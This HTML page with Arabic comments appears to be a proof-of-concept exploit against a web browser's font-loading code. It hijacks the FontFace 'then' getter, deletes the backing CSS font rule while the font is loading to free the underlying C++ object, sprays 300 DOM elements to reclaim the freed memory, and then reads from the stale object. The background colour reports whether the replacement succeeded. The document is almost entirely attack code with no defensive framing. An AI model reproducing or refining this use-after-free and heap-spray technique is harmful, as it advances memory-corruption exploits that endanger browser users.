<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }
</style>
</head>
<body style="background: black; color: #0f0; font-family: monospace; padding: 20px;">
    <div id="out">جاري فحص الاستبدال عبر طبقة الـ DOM...</div>
    <div id="trash-bin" style="display: none;"></div>

<script>
window.onload = () => {
    let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    let callbackCount = 0;
    let domElements = [];
    let bin = document.getElementById('trash-bin');

    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (this === A) {
                callbackCount++;
                
                if (callbackCount === 1) { 
                    // 1. تحرير كائن الخط من طبقة الـ ++C
                    document.getElementById('s').sheet.deleteRule(0);
                    
                    // 2. محاولة ملء الفراغ بكائنات ++C موازية عبر الـ DOM
                    for (let i = 0; i < 300; i++) {
                        let el = document.createElement('div');
                        // نضع قيم نصية مميزة تمثل "علامات" في الذاكرة
                        el.id = "DOM_" + i;
                        el.className = "spray_class_test";
                        
                        // إجبار المحرك على ربط العنصر بشجرة الـ DOM ليتم حجزه في الذاكرة فعلياً
                        bin.appendChild(el);
                        domElements.push(el);
                    }
                    
                    // 3. فحص استقرار الذاكرة بعد الاستبدال
                    setTimeout(() => {
                        try {
                            // محاولة استدعاء خاصية من الكائن المحرر لإجبار المتصفح على القراءة
                            let testRead = A.family;
                            
                            // إذا استقر المتصفح وقرأ دون انهيار، ننتقل للون الأصفر كمؤشر نجاح الاستبدال الطبقي
                            document.body.style.background = "#555500"; // بني/أصفر داكن
                            document.getElementById("out").innerText = "تم ملء الفراغ بكائنات DOM. المتصفح مستقر وقرأ الخاصية بنجاح.";
                            
                        } catch(e) {
                            document.body.style.background = "red";
                            document.getElementById("out").innerText = "حدث خطأ في القراءة: " + e.message;
                        }
                    }, 0);
                }
            }
            return undefined;
        }
    });

    document.fonts.load('1em targetFont', 'AB');
};
</script>
</body>
</html>
